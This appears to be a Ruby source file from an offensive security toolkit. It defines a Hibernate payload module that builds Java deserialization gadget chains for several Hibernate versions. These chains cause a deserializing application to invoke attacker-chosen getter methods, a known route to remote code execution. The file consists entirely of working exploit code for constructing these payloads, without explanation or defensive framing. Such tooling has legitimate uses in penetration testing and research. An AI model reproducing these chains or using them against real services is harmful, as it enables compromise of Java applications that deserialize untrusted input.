
require_relative '../serialize'
require_relative 'util'

module Java
  module Serialize
    module Payloads
      module Hibernate
        def make_annotproxy(cls, attrs = {}, ver = 5)
          if ver == 5
            Java::Serialize::JavaObject.new('Lorg/hibernate/validator/internal/util/annotationfactory/AnnotationProxy;', 'annotationType' => cls,
                                                                                                                         'values' => Java::Serialize::JavaObject.new('Ljava/util/HashMap;', 'elements' => attrs))
          elsif ver == 6
            Java::Serialize::JavaObject.new('Lorg/hibernate/validator/internal/util/annotation/AnnotationProxy;', 'descriptor' => Java::Serialize::JavaObject.new('Lorg/hibernate/validator/internal/util/annotation/AnnotationDescriptor;', 'type' => cls,
                                                                                                                                                                                                                                             'attributes' => Java::Serialize::JavaObject.new('Ljava/util/HashMap;', 'elements' => attrs)))
          else
            raise 'Unsupported version'
        end
      end
        module_function :make_annotproxy

        def validator_invoke_noarg(obj, clsname, method, ver: 5)
          cls = Java::Serialize::JavaClass.new(clsname)
          ah1 = make_annotproxy(cls, { method => nil }, ver)
          ah2 = make_annotproxy(cls, {}, ver)
          annoth = Java::Serialize::JavaObject.new('Lcom/sun/corba/se/spi/orbutil/proxy/CompositeInvocationHandlerImpl;', 'defaultHandler' => ah2,
                                                                                                                          'classToInvocationHandler' => Java::Serialize::JavaObject.new('Ljava/util/HashMap;', 'elements' => {
                                                                                                                                                                                          cls => Java::Serialize::Payloads::Util.delegateproxy(obj)
                                                                                                                                                                                        }))

          annot = Java::Serialize::JavaProxy.new(['java.lang.annotation.Annotation', clsname[1..-2].tr('/', '.')], annoth)
          Java::Serialize::JavaObject.new('Ljava/util/HashMap;', 'elements' => { annot => nil, ah1 => nil })
      end
        module_function :validator_invoke_noarg

        def make_typed_value(type, val, ver, entityMode: nil)
          if ver == 3
            Java::Serialize::JavaObject.new('Lorg/hibernate/engine/TypedValue;', 'type' => type,
                                                                                 'value' => val,
                                                                                 'entityMode' => entityMode)
          else
            Java::Serialize::JavaObject.new('Lorg/hibernate/engine/spi/TypedValue;', 'type' => type,
                                                                                     'value' => val)
          end
      end
        module_function :make_typed_value

        def hibernate3_invoke_noarg(target, cls, method)
          gc = 'Lorg/hibernate/property/Getter;'
          raise 'Unsupported, only getters' unless method.start_with?('get')
          get = Java::Serialize::JavaObject.new('Lorg/hibernate/property/BasicPropertyAccessor$BasicGetter;', 'clazz' => Java::Serialize::JavaClass.new(cls),
                                                                                                              'propertyName' => method[3].downcase + method[4..-1])

          tup = Java::Serialize::JavaObject.new('Lorg/hibernate/tuple/component/PojoComponentTuplizer;', 'getters' => JavaArray.new(gc, [get]),
                                                                                                         'propertySpan' => 1)

          pojo = Java::Serialize::JavaObject.new('Lorg/hibernate/EntityMode;', 'name' => 'POJO')

          tm = Java::Serialize::JavaObject.new('Lorg/hibernate/tuple/component/ComponentEntityModeToTuplizerMapping;', 'tuplizers' => Java::Serialize::JavaObject.new('Ljava/util/HashMap;', 'elements' => {
                                                                                                                                                                        pojo => tup
                                                                                                                                                                      }))

          ct = Java::Serialize::JavaObject.new('Lorg/hibernate/type/ComponentType;', 'tuplizerMapping' => tm,
                                                                                     'propertySpan' => 1)

          v1 = make_typed_value(ct, target, 3, entityMode: pojo)
          v2 = make_typed_value(ct, target, 3, entityMode: pojo)
          Java::Serialize::JavaObject.new('Ljava/util/HashMap;', 'elements' => { v1 => nil, v2 => nil })
        end
        module_function :hibernate3_invoke_noarg

        def hibernate_invoke_noarg(target, cls, method, ver: 5)
          return hibernate3_invoke_noarg(target, cls, method) if ver == 3

          gc = ''
          if ver == 5
            get = Java::Serialize::JavaObject.new('Lorg/hibernate/property/access/spi/GetterMethodImpl$SerialForm;', 'containerClass' => Java::Serialize::JavaClass.new(cls),
                                                                                                                     'propertyName' => 'foo',
                                                                                                                     'declaringClass' => Java::Serialize::JavaClass.new(cls),
                                                                                                                     'methodName' => method)
            gc = 'Lorg/hibernate/property/access/spi/Getter;'
          elsif ver == 4
            gc = 'Lorg/hibernate/property/Getter;'
            raise 'Unsupported, only getters' unless method.start_with?('get')
            get = Java::Serialize::JavaObject.new('Lorg/hibernate/property/BasicPropertyAccessor$BasicGetter;', 'clazz' => Java::Serialize::JavaClass.new(cls),
                                                                                                                'propertyName' => method[3].downcase + method[4..-1])
          else
            raise 'Unsupported'
          end

          tup = Java::Serialize::JavaObject.new('Lorg/hibernate/tuple/component/PojoComponentTuplizer;', 'getters' => JavaArray.new(gc, [get]),
                                                                                                         'propertySpan' => 1)

          ct = Java::Serialize::JavaObject.new('Lorg/hibernate/type/ComponentType;', 'componentTuplizer' => tup,
                                                                                     'propertySpan' => 1)

          v1 = make_typed_value(ct, target, ver)
          v2 = make_typed_value(ct, target, ver)
          Java::Serialize::JavaObject.new('Ljava/util/HashMap;', 'elements' => { v1 => nil, v2 => nil })
        end
        module_function :hibernate_invoke_noarg
          end
    end
  end
end
